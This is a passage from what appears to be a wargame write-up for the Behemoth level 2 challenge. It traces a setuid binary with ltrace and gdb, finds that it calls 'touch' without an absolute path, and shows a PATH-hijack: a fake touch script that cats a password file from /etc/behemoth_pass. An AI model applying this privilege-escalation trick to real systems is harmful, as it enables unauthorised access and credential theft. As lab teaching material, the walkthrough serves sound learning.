<li><p>So, we have a binary which when executed gives</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span>behemoth2@melinda:/behemoth$ ./behemoth2
touch: cannot touch &#39;13373&#39;: Permission denied
</pre></div>
</div>
<p>Let’s see what ltrace provides us</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>behemoth2@melinda:/behemoth$ ltrace ./behemoth2
__libc_start_main(0x804856d, 1, 0xffffd794, 0x8048640 &lt;unfinished ...&gt;
getpid()                                                                                                               = 14118
sprintf(&quot;touch 14118&quot;, &quot;touch %d&quot;, 14118)                                                                              = 11
__lxstat(3, &quot;14118&quot;, 0xffffd688)                                                                                       = -1
unlink(&quot;14118&quot;)                                                                                                        = -1
system(&quot;touch 14118&quot;touch: cannot touch &#39;14118&#39;: Permission denied
 &lt;no return ...&gt;
--- SIGCHLD (Child exited) ---
&lt;... system resumed&gt; )                                                                                                 = 256
sleep(2000
</pre></div>
</div>
<p>Let’s see a truncated output of disassemble main, if we see getpid gets the binary pid, sprintf something in some buffer, lstat provides thefile status, unlink -call the unlink function to remove the specified file.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disassemble</span> <span class="n">main</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="n">main</span><span class="p">:</span>
   <span class="mh">0x08048588</span> <span class="o">&lt;+</span><span class="mi">27</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">call</span>   <span class="mh">0x8048410</span> <span class="o">&lt;</span><span class="n">getpid</span><span class="nd">@plt</span><span class="o">&gt;</span>
   <span class="mh">0x080485b3</span> <span class="o">&lt;+</span><span class="mi">70</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">call</span>   <span class="mh">0x8048450</span> <span class="o">&lt;</span><span class="n">sprintf</span><span class="nd">@plt</span><span class="o">&gt;</span>
   <span class="mh">0x080485c7</span> <span class="o">&lt;+</span><span class="mi">90</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">call</span>   <span class="mh">0x80486c0</span> <span class="o">&lt;</span><span class="n">lstat</span><span class="o">&gt;</span>
   <span class="mh">0x080485df</span> <span class="o">&lt;+</span><span class="mi">114</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">call</span>   <span class="mh">0x8048400</span> <span class="o">&lt;</span><span class="n">unlink</span><span class="nd">@plt</span><span class="o">&gt;</span>
   <span class="mh">0x080485eb</span> <span class="o">&lt;+</span><span class="mi">126</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">call</span>   <span class="mh">0x8048420</span> <span class="o">&lt;</span><span class="n">system</span><span class="nd">@plt</span><span class="o">&gt;</span>
   <span class="mh">0x080485f7</span> <span class="o">&lt;+</span><span class="mi">138</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">call</span>   <span class="mh">0x80483e0</span> <span class="o">&lt;</span><span class="n">sleep</span><span class="nd">@plt</span><span class="o">&gt;</span>
   <span class="mh">0x08048616</span> <span class="o">&lt;+</span><span class="mi">169</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">call</span>   <span class="mh">0x8048420</span> <span class="o">&lt;</span><span class="n">system</span><span class="nd">@plt</span><span class="o">&gt;</span>
   <span class="mh">0x08048635</span> <span class="o">&lt;+</span><span class="mi">200</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">leave</span>
   <span class="mh">0x08048636</span> <span class="o">&lt;+</span><span class="mi">201</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">ret</span>
</pre></div>
</div>
<p>If you check the ltrace output</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;touch 14118&quot;</span><span class="n">touch</span><span class="p">:</span> <span class="n">cannot</span> <span class="n">touch</span> <span class="s1">&#39;14118&#39;</span><span class="p">:</span> <span class="n">Permission</span> <span class="n">denied</span>
</pre></div>
</div>
<p>touch is being called without an absolute path, so we can take advantage of that. First we’ll create our own touch script that prints out the contents /etc/behemoth_pass/behemoth3. Next, the PATH variable needs to be updated so that it looks at the current working directory first to ensure that our touch script is executed and not the actual touch program. PATH=/tmp:$PATH, you set /tmp to your primary location to search for binaries and the like… so if you create a file in /tmp/ called touch, it’ll actually execute that instead of /usr/bin/touch</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>behemoth2@melinda:/tmp/rahul2$ cat touch
cat /etc/behemoth_pass/behemoth3
behemoth2@melinda:/tmp/rahul2$ history | grep PATH
19  history | grep PATH
behemoth2@melinda:/tmp/rahul2$ PATH=/tmp/rahul2:$PATH /behemoth/behemoth2
**********
</pre></div>
</div>
</div></blockquote>
</section>
<section id="changelog">
<h3>Changelog<a class="headerlink" href="#changelog" title="Link to this heading"></a></h3>
</section>
</section>
</section>


           </div>
          </div>
          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
        <a href="../Series_Vulnerable_Machines/LFC-VM-P4-Appendix.html" class="btn btn-neutral float-left" title="Appendix" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
        <a href="LFC-Forensics.html" class="btn btn-neutral float-right" title="Forensics" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
    </div>

  <hr/>

  <div role="contentinfo">
    <p>&#169; Copyright Vijay Kumar &amp; Contributors.</p>
  </div>

   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(false);
      });
  </script> 

</body>
</html>